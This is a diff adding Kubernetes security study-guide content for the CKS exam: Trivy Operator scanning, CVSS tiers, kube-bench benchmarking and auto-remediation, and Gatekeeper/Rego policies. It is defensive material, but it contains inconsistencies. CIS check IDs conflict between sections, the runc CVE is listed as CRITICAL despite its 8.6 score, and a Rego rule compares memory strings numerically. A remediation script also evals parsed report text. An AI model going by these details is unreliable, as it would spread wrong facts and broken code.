@@ -27992,6 +27992,152 @@ kubectl get vulnerabilityreports -A \
                         <div class="scenario-step"><div class="step-marker">🛡️</div><div class="step-content"><strong>With Trivy Operator</strong><p>Trivy re-scans within 6 hours. New VulnerabilityReport CRD shows CRITICAL CVE. Alert fires to Slack/PagerDuty. Team patches runc + rebuilds within hours. <strong>4-hour window vs 14-day window.</strong></p></div></div>
                     </div>
                 </div>
+
+                <h4>Trivy CLI vs Trivy Operator — When to Use Which</h4>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>Aspect</th><th>Trivy CLI</th><th>Trivy Operator</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>Where it runs</strong></td><td>CI/CD pipeline, developer laptop</td><td>Inside the Kubernetes cluster (Deployment)</td></tr>
+                            <tr><td><strong>When it scans</strong></td><td>On image push / on demand</td><td>Continuously — every 6 hours + on new pod creation</td></tr>
+                            <tr><td><strong>What it scans</strong></td><td>Container images, filesystems, git repos</td><td>All running container images + cluster configs</td></tr>
+                            <tr><td><strong>Output format</strong></td><td>Table, JSON, SARIF, HTML report</td><td>Kubernetes CRDs (VulnerabilityReport, ConfigAuditReport)</td></tr>
+                            <tr><td><strong>Alerting</strong></td><td>Manual — CI fails the pipeline</td><td>Automatic — CRD changes trigger Prometheus alerts</td></tr>
+                            <tr><td><strong>Best for</strong></td><td>Shift-left: catch CVEs BEFORE deployment</td><td>Shift-right: catch CVEs AFTER deployment (new CVEs, running images)</td></tr>
+                            <tr><td><strong>Exam note</strong></td><td>Used in CI/CD for image scanning (Ch 25-26)</td><td>Used in-cluster for continuous monitoring (this chapter)</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>Trivy Operator CRDs — The Full Vulnerability Data Model</h4>
+                <p>Trivy Operator creates <strong>five types of CRDs</strong> in your cluster. Each one represents a different security dimension:</p>
+                <div class="card-grid cols-3">
+                    <div class="info-card"><div class="card-icon-lg">🔴</div><h5>VulnerabilityReport</h5><p>Per-workload CVE scan. Maps every CVE to the pod's container images. <strong>This is the primary CRD for continuous scanning.</strong> Updated on schedule + on pod changes.</p><p><small>Namespaced — one per ReplicaSet/Deployment/StatefulSet</small></p></div>
+                    <div class="info-card"><div class="card-icon-lg">⚙️</div><h5>ConfigAuditReport</h5><p>Checks Kubernetes workload manifests for misconfigurations: privileged containers, writable filesystems, missing resource limits, hostPath mounts. <strong>Like kubesec but continuous.</strong></p><p><small>Namespaced — one per workload</small></p></div>
+                    <div class="info-card"><div class="card-icon-lg">🔑</div><h5>ExposedSecretReport</h5><p>Scans for exposed passwords, API keys, tokens in container images and ConfigMaps. <strong>Hardcoded secrets are a top OWASP risk.</strong></p><p><small>Namespaced — one per workload</small></p></div>
+                    <div class="info-card"><div class="card-icon-lg">📊</div><h5>ClusterComplianceReport</h5><p>Aggregates findings per namespace or cluster-wide against CIS/NSA/PSS benchmarks. Shows pass/fail counts per control group.</p><p><small>Cluster-scoped — summary across namespaces</small></p></div>
+                    <div class="info-card"><div class="card-icon-lg">📦</div><h5>SbomReport</h5><p>Software Bill of Materials — lists every package in your container image. <strong>Critical for supply chain transparency</strong> and identifying affected images when a new CVE drops.</p><p><small>Namespaced — one per workload</small></p></div>
+                </div>
+
+                <h4>CVE Severity Classification — Understanding CVSS Scores</h4>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>Severity</th><th>CVSS Range</th><th>Typical Attack</th><th>Response SLA</th><th>Example</th></tr></thead>
+                        <tbody>
+                            <tr><td><span style="color:#dc2626;font-weight:700;">🔴 CRITICAL</span></td><td>9.0 — 10.0</td><td>Remote code execution, container breakout, unauthenticated root access</td><td>Patch within <strong>24 hours</strong></td><td>CVE-2024-21626 (runc breakout, 8.6), Log4Shell (CVE-2021-44228, 10.0)</td></tr>
+                            <tr><td><span style="color:#f97316;font-weight:700;">🟠 HIGH</span></td><td>7.0 — 8.9</td><td>Privilege escalation, DoS, arbitrary file read</td><td>Patch within <strong>7 days</strong></td><td>CVE-2023-44487 (HTTP/2 Rapid Reset, 7.5)</td></tr>
+                            <tr><td><span style="color:#eab308;font-weight:700;">🟡 MEDIUM</span></td><td>4.0 — 6.9</td><td>Information disclosure, limited DoS, XSS</td><td>Patch within <strong>30 days</strong></td><td>CVE-2023-38545 (curl heap overflow, 7.5 → downgraded, actual 5.9)</td></tr>
+                            <tr><td><span style="color:#4ade80;font-weight:700;">🟢 LOW</span></td><td>0.1 — 3.9</td><td>Theoretical attacks, hard-to-exploit</td><td>Patch in next release cycle</td><td>Minor information exposure via timing attack</td></tr>
+                            <tr><td><span style="color:#8b949e;font-weight:700;">⚪ NONE</span></td><td>0.0</td><td>No practical security impact</td><td>Informational only</td><td>Version disclosure without attack vector</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>Continuous Scanning Workflow — End-to-End</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">Trivy Operator Lifecycle: Scan → Report → Alert → Remediate</div>
+<pre>
+  1. IMAGE PUSHED                    4. ALERT FIRED
+     to registry                       ┌───────────────────────┐
+         │                             │  AlertManager → Slack │
+         ▼                             │  "CRITICAL CVE in     │
+  2. TRIVY OPERATOR SCAN TRIGGERS      │   anihpj-prod/anihpj" │
+     ┌─────────────────────────┐       └───────────┬───────────┘
+     │ Trigger 1: New pod created│                  │
+     │ Trigger 2: 6-hour schedule │                 │ 5. OPERATOR RESPONDS
+     │ Trigger 3: New CVE in NVD  │                 │    kubectl get vulnerabilityreports
+     └─────────────┬───────────────┘                 │    → Identify affected pods
+                   │                                 │    → Rebuild image with fix
+                   ▼                                 │    → kubectl set image deploy/anihpj ...
+  3. VULNERABILITYREPORT CREATED                     ▼
+     apiVersion: aquasecurity.github.io/v1alpha1   6. NEW PODS ARE CLEAN
+     kind: VulnerabilityReport                        Trivy re-scans → 0 CRITICAL
+     report:
+       vulnerabilities:                               ClusterComplianceReport: PASS
+       - id: CVE-2024-21626
+         severity: CRITICAL   ← Prometheus scrapes this
+         score: 8.6
+</pre>
+                </div>
+
+                <h4>Trivy vs Other Scanners — The CKS Landscape</h4>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>Scanner</th><th>Type</th><th>K8s-Native?</th><th>Best For</th><th>License</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>Trivy</strong></td><td>CLI + Operator</td><td>✅ Yes (CRDs)</td><td>General-purpose: images, filesystems, git, K8s configs, SBOM</td><td>Apache 2.0</td></tr>
+                            <tr><td><strong>Clair</strong></td><td>API server + Operator</td><td>✅ Yes (Clair CRDs)</td><td>Image vulnerability matching against known databases</td><td>Apache 2.0</td></tr>
+                            <tr><td><strong>Grype</strong></td><td>CLI only</td><td>❌ No operator</td><td>Fast local scanning in CI/CD. Good for dev workflows.</td><td>Apache 2.0</td></tr>
+                            <tr><td><strong>Snyk</strong></td><td>CLI + Controller</td><td>✅ Yes (Snyk Monitor)</td><td>Enterprise with paid vulnerability database, fix advice, license compliance</td><td>Proprietary (free tier)</td></tr>
+                            <tr><td><strong>Anchore</strong></td><td>CLI + Engine</td><td>⚠️ Partial (via webhook)</td><td>Policy-based image compliance. Define policies as code.</td><td>Apache 2.0</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>How Trivy Works Internally — The Scanning Engine Explained</h4>
+                <p>Understanding <em>how</em> Trivy detects vulnerabilities is essential for troubleshooting and for the CKS exam. Trivy's scanning pipeline has three phases:</p>
+                <div class="process-steps">
+                    <div class="step"><span class="step-number">1</span><strong>Image Acquisition</strong><p>Trivy pulls the image manifest and layer metadata <strong>without downloading the full image</strong>. It uses the OCI Distribution API to fetch only the filesystem layers it needs. This is why Trivy is fast — it doesn't need to <code>docker pull</code> the entire image.</p></div>
+                    <div class="step"><span class="step-number">2</span><strong>Package Enumeration</strong><p>Trivy walks each layer's filesystem, identifying installed packages. It supports 20+ package managers: <code>dpkg</code>/<code>apt</code> (Debian/Ubuntu), <code>rpm</code>/<code>yum</code>/<code>dnf</code> (RHEL/CentOS/Fedora), <code>apk</code> (Alpine), <code>pip</code>/<code>poetry</code>/<code>pipenv</code> (Python), <code>npm</code>/<code>yarn</code> (Node.js), <code>gem</code> (Ruby), <code>gomod</code> (Go), <code>jar</code>/<code>pom</code> (Java). It also reads SBOMs if present.</p></div>
+                    <div class="step"><span class="step-number">3</span><strong>Vulnerability Matching</strong><p>Each package (name + version) is looked up against Trivy's vulnerability databases. Databases are downloaded from: <strong>NVD</strong> (National Vulnerability Database), <strong>GitHub Advisory Database</strong> (GHSA), <strong>Red Hat OVAL</strong> v2, <strong>Debian Security Tracker</strong>, <strong>Alpine SecDB</strong>, <strong>Amazon Linux ALAS</strong>, and <strong>SUSE OVAL</strong>. The database is cached locally at <code>~/.cache/trivy/db/</code> and refreshed every 6 hours.</p></div>
+                </div>
+
+                <div class="info-box note">
+                    <div class="info-box-title">🔬 Why database freshness matters</div>
+                    <p>Trivy's accuracy depends entirely on its vulnerability database being current. If the database is 7 days old, it won't detect CVEs published in the last week. The <code>--skip-db-update</code> flag skips the database refresh — useful in air-gapped environments where you manage the DB separately, but <strong>dangerous in production</strong> if you forget to update it.</p>
+                </div>
+
+                <h4>Troubleshooting Common Trivy Operator Issues</h4>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>Symptom</th><th>Likely Cause</th><th>Fix</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>No VulnerabilityReports created</strong></td><td>Trivy Operator pod is CrashLoopBackOff. Check with <code>kubectl logs -n trivy-system deploy/trivy-operator</code>. Common: OOMKilled due to insufficient memory.</td><td>Increase memory limits: <code>--set trivy.resources.limits.memory=4Gi</code>. The vulnerability DB alone is ~500MB compressed.</td></tr>
+                            <tr><td><strong>VulnerabilityReport shows "Unknown" severity</strong></td><td>CVSS score is missing from the CVE entry in NVD. Some CVEs are published without scores initially.</td><td>Wait 24-48 hours for NVD to assign a score. Use <code>--severity CRITICAL,HIGH</code> to filter out unknowns.</td></tr>
+                            <tr><td><strong>Scans take too long (>10 min per image)</strong></td><td>Large images (1GB+) with many layers. Trivy downloads each layer sequentially.</td><td>Use smaller base images (distroless, Alpine). Set <code>scanJobsConcurrentLimit</code> to control parallelism. Schedule scans during low-traffic hours.</td></tr>
+                            <tr><td><strong>Private registry images not scanned</strong></td><td>Trivy Operator doesn't have credentials to pull from private registries.</td><td>Create a Secret with registry credentials and reference it: <code>kubectl create secret docker-registry regcred --docker-server=myreg.io --docker-username=... --docker-password=...</code> then <code>helm upgrade trivy-operator aqua/trivy-operator --set trivy.privateRegistryScanSecretsNames={regcred}</code></td></tr>
+                            <tr><td><strong>ClusterComplianceReport shows stale data</strong></td><td>Scans are scheduled but not completing. Check if scan jobs are pending or failing.</td><td><code>kubectl get jobs -n trivy-system</code> — look for failed/pending scan jobs. Increase <code>scanJobsConcurrentLimit</code> if jobs are queued.</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>Integrating Trivy Operator with External Alerting</h4>
+                <p>Trivy Operator itself doesn't send alerts. It creates CRDs. You need external tooling to watch those CRDs and fire notifications:</p>
+                <div class="diagram-container">
+                    <div class="diagram-title">Trivy Operator Alerting Integration Patterns</div>
+<pre>
+  PATTERN 1: PROMETHEUS + ALERTMANAGER (recommended)
+  ┌─────────────────┐    ┌──────────────┐    ┌───────────────┐
+  │ Trivy Operator  │───▶│ Prometheus   │───▶│ AlertManager  │──▶ Slack/PagerDuty
+  │ exposes /metrics │    │ scrapes /30s │    │ evaluates rules│
+  └─────────────────┘    └──────────────┘    └───────────────┘
+
+  PATTERN 2: KUBERNETES WATCH + WEBHOOK (custom)
+  ┌─────────────────┐    ┌──────────────────┐    ┌──────────────┐
+  │ Trivy Operator  │───▶│ Custom controller │───▶│ Slack Webhook│
+  │ creates CRDs    │    │ watches CRD changes│   │ POST JSON    │
+  └─────────────────┘    └──────────────────┘    └──────────────┘
+
+  PATTERN 3: GRAFANA ALERTING (simplest)
+  ┌─────────────────┐    ┌──────────────┐    ┌───────────────┐
+  │ Prometheus      │───▶│ Grafana      │───▶│ Slack/Email   │
+  │ (datasource)    │    │ Alert rules  │    │ via built-in   │
+  └─────────────────┘    └──────────────┘    └───────────────┘
+</pre>
+                </div>
+
+                <h4>Decision Framework: How Often Should You Scan?</h4>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>Environment</th><th>Scan Frequency</th><th>Rationale</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>Production</strong></td><td>Every 1-6 hours</td><td>New CVEs appear continuously. A CRITICAL CVE (CVSS 9+) should be detected within hours, not days. Set <code>trivy.scanJobTimeout=10m</code> to avoid scans overlapping.</td></tr>
+                            <tr><td><strong>Staging</strong></td><td>Every 12 hours</td><td>Images here should already be pre-scanned in CI/CD. Continuous scanning catches drift and newly-discovered CVEs in approved images.</td></tr>
+                            <tr><td><strong>Development</strong></td><td>Every 24 hours</td><td>Lower urgency. Focus is on catching issues before they reach staging/prod. Use <code>--severity CRITICAL</code> only to reduce noise.</td></tr>
+                            <tr><td><strong>CI/CD Pipeline</strong></td><td>On every push</td><td>Block the pipeline if CRITICAL CVEs are found. This is the last gate before the image reaches any cluster.</td></tr>
+                        </tbody>
+                    </table>
+                </div>
             </div>
 
             <!-- ═══════════ SECTION 32.2 ═══════════ -->
@@ -28081,6 +28227,215 @@ fi</code></pre>
                         </tbody>
                     </table>
                 </div>
+
+                <h4>The CIS Kubernetes Benchmark — What It Covers</h4>
+                <p>The <strong>CIS (Center for Internet Security) Kubernetes Benchmark</strong> is the industry-standard security configuration guide. It organizes checks into <strong>5 sections</strong>:</p>
+                <div class="card-grid cols-3">
+                    <div class="info-card"><div class="card-icon-lg">🔐</div><h5>Section 1: Control Plane</h5><p>API server, scheduler, controller-manager flags. Covers anonymous auth, insecure ports, TLS configuration, audit logging. <strong>~30 checks</strong> for master nodes only.</p></div>
+                    <div class="info-card"><div class="card-icon-lg">💾</div><h5>Section 2: etcd</h5><p>etcd-specific security: peer/client TLS, auto-TLS disabled, certificate file permissions. <strong>~10 checks</strong> for etcd nodes.</p></div>
+                    <div class="info-card"><div class="card-icon-lg">🖥️</div><h5>Section 3: Control Plane Config</h5><p>File permissions and ownership for Kubernetes PKI certificates, config files, service account keys. <strong>~15 checks</strong> for master nodes.</p></div>
+                    <div class="info-card"><div class="card-icon-lg">⚙️</div><h5>Section 4: Worker Nodes</h5><p>Kubelet configuration, kube-proxy settings, read-only port disabled, RotateKubeletServerCertificate enabled. <strong>~20 checks</strong> for all nodes.</p></div>
+                    <div class="info-card"><div class="card-icon-lg">📜</div><h5>Section 5: Policies</h5><p>RBAC, PodSecurityPolicies/Standards, NetworkPolicies, Secret management, admission control plugins. <strong>~30 checks</strong> — cluster-wide.</p></div>
+                </div>
+
+                <h4>kube-bench Output — Understanding the Report</h4>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">Text — Example kube-bench output (abbreviated)</span>
+                    </div>
+                    <pre><code class="language-text">[INFO] 1 Master Node Security Configuration
+[INFO] 1.1 Master Node Configuration Files
+[PASS] 1.1.1 Ensure that the API server pod specification file
+        permissions are set to 600 or more restrictive (Automated)
+[PASS] 1.1.2 Ensure that the API server pod specification file
+        ownership is set to root:root (Automated)
+[FAIL] 1.1.3 Ensure that the controller manager pod specification
+        file permissions are set to 600 or more restrictive (Automated)
+[FAIL] 1.1.4 Ensure that the controller manager pod specification
+        file ownership is set to root:root (Automated)
+
+[INFO] 1.2 API Server
+[PASS] 1.2.1 Ensure that the --anonymous-auth argument is set to false
+[PASS] 1.2.2 Ensure that the --basic-auth-file argument is not set
+[FAIL] 1.2.3 Ensure that the --token-auth-file parameter is not set
+
+... (continued for ~100 checks)
+
+== Remediations ==
+1.1.3 Run: chmod 600 /etc/kubernetes/manifests/kube-controller-manager.yaml
+1.1.4 Run: chown root:root /etc/kubernetes/manifests/kube-controller-manager.yaml
+1.2.3 Remove the --token-auth-file from the API server manifest
+
+== Summary ==
+40 checks PASS
+6 checks FAIL
+2 checks WARN
+1 checks INFO</code></pre>
+                </div>
+
+                <h4>kube-bench as a DaemonSet — Alternative to CronJob</h4>
+                <p>A CronJob runs kube-bench on a schedule. A <strong>DaemonSet</strong> runs it on every node continuously. Use DaemonSet when you need per-node results and faster drift detection (every hour vs nightly):</p>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">YAML — kube-bench as a DaemonSet (runs on every node)</span>
+                    </div>
+                    <pre><code class="language-yaml">apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: kube-bench
+  namespace: security
+spec:
+  selector:
+    matchLabels:
+      app: kube-bench
+  template:
+    metadata:
+      labels:
+        app: kube-bench
+    spec:
+      hostPID: true
+      containers:
+      - name: kube-bench
+        image: aquasec/kube-bench:v0.8.0
+        command:
+        - /bin/sh
+        - -c
+        - |
+          while true; do
+            kube-bench --benchmark cis-1.23 --json \
+              --outputfile /results/kube-bench-$(date +%Y%m%d-%H%M%S).json
+            sleep 3600   # Run every hour
+          done
+        volumeMounts:
+        - name: results
+          mountPath: /results
+        - name: etc-kubernetes
+          mountPath: /etc/kubernetes
+          readOnly: true
+        - name: var-lib
+          mountPath: /var/lib
+          readOnly: true
+      volumes:
+      - name: results
+        emptyDir: {}
+      - name: etc-kubernetes
+        hostPath:
+          path: /etc/kubernetes
+          type: Directory
+      - name: var-lib
+        hostPath:
+          path: /var/lib
+          type: Directory</code></pre>
+                </div>
+
+                <h4>Drift Detection Decision Tree</h4>
+                <div class="decision-tree">
+                    <div class="decision-node"><strong>Did kube-bench fail count increase from baseline?</strong></div>
+                    <div class="decision-branches">
+                        <div class="branch yes"><span class="branch-label">YES → Drift Detected</span><p>Investigate immediately. Check git log for cluster config changes, audit log for manual kubectl edits, node SSH access logs. Determine which CIS check newly failed and why.</p></div>
+                        <div class="branch no"><span class="branch-label">NO → No Drift</span><p>Cluster configuration is stable. Record pass count as new baseline. Continue monitoring on schedule.</p></div>
+                    </div>
+                </div>
+
+                <h4>Common kube-bench Failures — Exact Remediation Commands</h4>
+                <p>The CKS exam may ask you to fix specific CIS benchmark failures. Here are the most common ones and their exact fixes:</p>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>CIS ID</th><th>Failure</th><th>Exact Remediation Command</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>1.1.1</strong></td><td>API server <code>--anonymous-auth</code> is true</td><td>Edit <code>/etc/kubernetes/manifests/kube-apiserver.yaml</code>, set <code>--anonymous-auth=false</code>. The kubelet auto-restarts the API server.</td></tr>
+                            <tr><td><strong>1.1.3</strong></td><td>Controller manager pod spec permissions not 600</td><td><code>chmod 600 /etc/kubernetes/manifests/kube-controller-manager.yaml</code></td></tr>
+                            <tr><td><strong>1.1.4</strong></td><td>Controller manager pod spec ownership not root:root</td><td><code>chown root:root /etc/kubernetes/manifests/kube-controller-manager.yaml</code></td></tr>
+                            <tr><td><strong>1.1.9</strong></td><td>API server <code>--authorization-mode</code> doesn't include Node,RBAC</td><td>Edit API server manifest, set <code>--authorization-mode=Node,RBAC</code>. This is critical — without Node authorization, kubelets can access any resource.</td></tr>
+                            <tr><td><strong>1.2.6</strong></td><td>API server <code>--profiling</code> is true (exposes debug endpoints)</td><td>Edit API server manifest, set <code>--profiling=false</code>. Profiling exposes memory/CPU data that aids reconnaissance.</td></tr>
+                            <tr><td><strong>2.3.1</strong></td><td>etcd <code>--auto-tls</code> is true (allows self-signed certs)</td><td>Edit <code>/etc/kubernetes/manifests/etcd.yaml</code>, remove <code>--auto-tls=true</code> or set <code>--auto-tls=false</code></td></tr>
+                            <tr><td><strong>4.1.1</strong></td><td>kubelet <code>--anonymous-auth</code> is true (unauthenticated kubelet access)</td><td>Edit kubelet config (<code>/var/lib/kubelet/config.yaml</code>), set <code>authentication.anonymous.enabled: false</code>, restart kubelet</td></tr>
+                            <tr><td><strong>4.2.1</strong></td><td>kubelet <code>--read-only-port</code> is non-zero (exposes unauthenticated metrics)</td><td>Edit kubelet config, set <code>readOnlyPort: 0</code>. This disables the legacy unauthenticated port 10255.</td></tr>
+                            <tr><td><strong>5.1.5</strong></td><td>Default ServiceAccount has cluster-admin binding</td><td><code>kubectl delete clusterrolebinding default-cluster-admin</code> (if it exists). Default SA should have NO permissions.</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>kube-bench in CI/CD — Shift-Left Security Benchmarking</h4>
+                <p>Running kube-bench as a CronJob detects drift <em>after</em> it happens. Running it in CI/CD <strong>prevents</strong> drift before cluster provisioning. Integrate kube-bench into your Infrastructure-as-Code pipeline:</p>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">Bash — GitHub Actions: Run kube-bench after Terraform provisions a new cluster</span>
+                    </div>
+                    <pre><code class="language-yaml"># .github/workflows/cluster-security.yml
+name: Cluster Security Validation
+on:
+  push:
+    paths:
+    - 'terraform/**'
+    - 'ansible/**'
+jobs:
+  security-benchmark:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Run kube-bench on newly-provisioned cluster
+      run: |
+        # Download kube-bench binary
+        curl -L https://github.com/aquasecurity/kube-bench/releases/download/v0.8.0/kube-bench_0.8.0_linux_amd64.tar.gz | tar xz
+
+        # Run against the cluster (uses current kubeconfig)
+        ./kube-bench --benchmark cis-1.23 \
+          --targets master,node \
+          --json \
+          --outputfile kube-bench-results.json
+
+        # Parse results — fail pipeline if any FAIL
+        FAIL_COUNT=$(jq '[.Controls[].groups[].checks[] | select(.state=="FAIL")] | length' kube-bench-results.json)
+
+        if [ "$FAIL_COUNT" -gt 0 ]; then
+          echo "❌ $FAIL_COUNT CIS benchmark checks FAILED"
+          jq '.Controls[].groups[].checks[] | select(.state=="FAIL") | {id: .id, description: .text}' kube-bench-results.json
+          exit 1
+        fi
+        echo "✅ All CIS checks passed"
+
+    - name: Store baseline for drift detection
+      run: |
+        kubectl create configmap kube-bench-baseline \
+          --from-file=kube-bench-results.json \
+          -n security --dry-run=client -o yaml | kubectl apply -f -</code></pre>
+                </div>
+
+                <h4>Automated Remediation — From Detection to Fix</h4>
+                <p>Detecting drift is half the battle. <strong>Automated remediation</strong> closes the loop — when kube-bench finds a known fixable failure, fix it automatically instead of opening a ticket:</p>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">Bash — Auto-remediate common kube-bench failures (use with caution!)</span>
+                    </div>
+                    <pre><code class="language-bash">#!/bin/bash
+# Run kube-bench, parse results, auto-fix known-safe failures
+# ⚠️ ONLY run in non-production environments first. Test thoroughly.
+
+REPORT=$(kube-bench --benchmark cis-1.23 --json 2>/dev/null)
+
+# Auto-fix: File permissions (1.1.3, 1.1.4, 1.1.5 — always safe to fix)
+echo "$REPORT" | jq -r '.Controls[].groups[].checks[] |
+  select(.state=="FAIL" and (.id | test("1.1.[3-5]"))) |
+  .remediation' | while read -r cmd; do
+  echo "Auto-fixing: $cmd"
+  eval "$cmd"  # Execute the remediation command
+done
+
+# Auto-fix: Anonymous auth (1.1.1 — safe if you have RBAC)
+if echo "$REPORT" | jq -e '.Controls[].groups[].checks[] |
+  select(.id=="1.1.1" and .state=="FAIL")' > /dev/null 2>&1; then
+  echo "Auto-fixing: Disabling anonymous auth on API server"
+  sed -i 's/--anonymous-auth=true/--anonymous-auth=false/' \
+    /etc/kubernetes/manifests/kube-apiserver.yaml
+fi
+
+echo "✅ Automated remediation complete. Re-run kube-bench to verify."</code></pre>
+                </div>
+
+                <div class="info-box warning">
+                    <div class="info-box-title">⚠️ Auto-Remediation Risks</div>
+                    <p>Not all CIS failures are safe to auto-fix. <strong>Never auto-fix</strong> these in production without approval: etcd TLS changes (can break the cluster), RBAC changes (may break running workloads), kubelet flags (requires restart — may drain nodes). Always test auto-remediation in staging first, and implement as a <strong>suggestion</strong> (PR) rather than direct fix for production.</p>
+                </div>
             </div>
 
             <!-- ═══════════ SECTION 32.3 ═══════════ -->
@@ -28148,6 +28503,227 @@ kubectl get constraints -A -o json | \
                     <div class="step"><span class="step-number">2</span><strong>Review violation reports weekly</strong><p>Security team reviews <code>kubectl get constraints -A</code> output. Prioritize by namespace (prod first).</p></div>
                     <div class="step"><span class="step-number">3</span><strong>Remediate violating resources</strong><p>Fix manifests, rebuild images, update deployments. Verify violation count decreases.</p></div>
                     <div class="step"><span class="step-number">4</span><strong>Switch to enforcement</strong><p>When violation count hits 0 for 2 consecutive weeks, switch constraint to <code>deny</code> mode. New violations blocked.</p></div>
+                </div>
+
+                <h4>OPA vs Gatekeeper — Understanding the Architecture</h4>
+                <p>OPA (Open Policy Agent) is the <strong>policy engine</strong>. Gatekeeper is the <strong>Kubernetes admission controller</strong> built on top of OPA. Key distinction for the CKS exam:</p>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>Aspect</th><th>OPA (Standalone)</th><th>OPA Gatekeeper</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>Architecture</strong></td><td>General-purpose policy engine (REST API). Can be used for any system — Terraform, Envoy, SSH, etc.</td><td>Kubernetes-native admission webhook. Uses OPA's Rego language under the hood.</td></tr>
+                            <tr><td><strong>Kubernetes integration</strong></td><td>Manual — you deploy OPA as a sidecar, write custom admission webhook config</td><td>Automatic — Gatekeeper registers as a ValidatingWebhookConfiguration</td></tr>
+                            <tr><td><strong>Policy language</strong></td><td>Rego (OPA's custom declarative language)</td><td>Rego, but wrapped in CRDs (ConstraintTemplate + Constraint)</td></tr>
+                            <tr><td><strong>Audit capability</strong></td><td>Manual — you query OPA's REST API with data</td><td>Built-in — audit runs every 60s and updates <code>status.totalViolations</code></td></tr>
+                            <tr><td><strong>Best for</strong></td><td>Multi-system policy enforcement (beyond Kubernetes)</td><td>Kubernetes-only admission control + continuous audit</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>Gatekeeper ConstraintTemplate — The Rego Policy Engine</h4>
+                <p>The <strong>ConstraintTemplate</strong> defines WHAT to check. The <strong>Constraint</strong> defines HOW STRICTLY to check (parameters). This separation allows reusing the same Rego logic with different parameters across namespaces:</p>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">YAML — Custom ConstraintTemplate: Require all containers to have memory limits</span>
+                    </div>
+                    <pre><code class="language-yaml">apiVersion: templates.gatekeeper.sh/v1beta1
+kind: ConstraintTemplate
+metadata:
+  name: k8srequirememorylimits
+spec:
+  crd:
+    spec:
+      names:
+        kind: K8sRequireMemoryLimits
+      validation:
+        openAPIV3Schema:
+          properties:
+            minMemory:         # Parameter: minimum memory limit
+              type: string
+  targets:
+  - target: admission.k8s.gatekeeper.sh
+    rego: |
+      package k8srequirememorylimits
+
+      violation[{"msg": msg}] {
+        container := input.review.object.spec.containers[_]
+        not container.resources.limits.memory   # No limit set
+        msg := sprintf("container <%v> has no memory limit", [container.name])
+      }
+
+      violation[{"msg": msg}] {
+        container := input.review.object.spec.containers[_]
+        min_mem := input.parameters.minMemory
+        container.resources.limits.memory < min_mem
+        msg := sprintf("container <%v> memory limit %v is below minimum %v",
+              [container.name, container.resources.limits.memory, min_mem])
+      }</code></pre>
+                </div>
+
+                <h4>Instantiate the Constraint — Enforce or Audit</h4>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">YAML — Constraint: Enforce 256Mi minimum memory limit in production</span>
+                    </div>
+                    <pre><code class="language-yaml">apiVersion: constraints.gatekeeper.sh/v1beta1
+kind: K8sRequireMemoryLimits    # Matches ConstraintTemplate
+metadata:
+  name: prod-memory-limits
+spec:
+  enforcementAction: deny       # "deny" = enforce, "dryrun" = audit only
+  match:
+    kinds:
+    - apiGroups: [""]
+      kinds: [Pod]
+    namespaces: ["anihpj-prod"]
+  parameters:
+    minMemory: "256Mi"</code></pre>
+                </div>
+
+                <h4>Violation Lifecycle — From Detection to Resolution</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">Gatekeeper Audit Lifecycle: How Existing Violations Are Tracked</div>
+<pre>
+  TIME ──────────────────────────────────────────────────────────────────►
+
+  T0: Constraint created (enforcementAction: dryrun)
+  │
+  ├─ T+60s: First audit runs
+  │   └── status.totalViolations: 12 (12 pods don't have memory limits)
+  │
+  ├─ T+7d: Weekly review. Security team sees 12 violations.
+  │   └── Action: Jira tickets created for each violating namespace
+  │
+  ├─ T+10d: 8 pods fixed (new deployments with memory limits)
+  │   └── Audit detects: status.totalViolations: 4 (auto-updated!)
+  │
+  ├─ T+14d: Remaining 4 fixed
+  │   └── status.totalViolations: 0
+  │
+  ├─ T+21d: 2 weeks clean → Switch to enforcementAction: deny
+  │   └── Any new pod without memory limit is REJECTED at admission
+  │
+  └─ T+30d: New dev pushes pod without limit → BLOCKED
+      └── Error: admission webhook "validation.gatekeeper.sh" denied: ...
+</pre>
+                </div>
+
+                <h4>Rego Language Deep Dive — The Core of OPA/Gatekeeper</h4>
+                <p>Rego is a <strong>declarative</strong> policy language. You describe <em>what</em> a violation looks like, not <em>how</em> to find it. Understanding Rego is critical for writing custom Gatekeeper policies on the CKS exam:</p>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">Rego — Annotated Rego policy explained line by line</span>
+                    </div>
+                    <pre><code class="language-rego">package k8sdisallowhostports    # ① Package name = ConstraintTemplate name
+
+# ② violation[] is a PARTIAL SET. Each iteration that reaches `msg :=`
+#    adds one element to the set. Gatekeeper reports ALL elements as violations.
+violation[{"msg": msg}] {
+
+    # ③ input.review.object is the Kubernetes resource being evaluated.
+    #    For a Pod admission review, it contains the full Pod spec.
+    container := input.review.object.spec.containers[_]
+
+    # ④ The underscore [_] is Rego's "iterate over all elements" operator.
+    #    This line iterates over ALL containers in the pod.
+
